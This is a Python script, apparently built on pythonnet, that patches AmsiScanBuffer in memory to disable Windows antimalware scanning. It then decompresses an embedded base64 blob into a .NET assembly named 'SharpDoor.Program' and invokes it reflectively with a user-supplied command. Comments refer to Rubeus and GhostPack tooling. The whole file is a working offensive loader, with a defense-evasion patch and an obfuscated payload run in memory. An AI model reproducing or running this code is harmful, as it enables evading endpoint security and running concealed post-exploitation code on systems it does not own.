import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpDoor.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()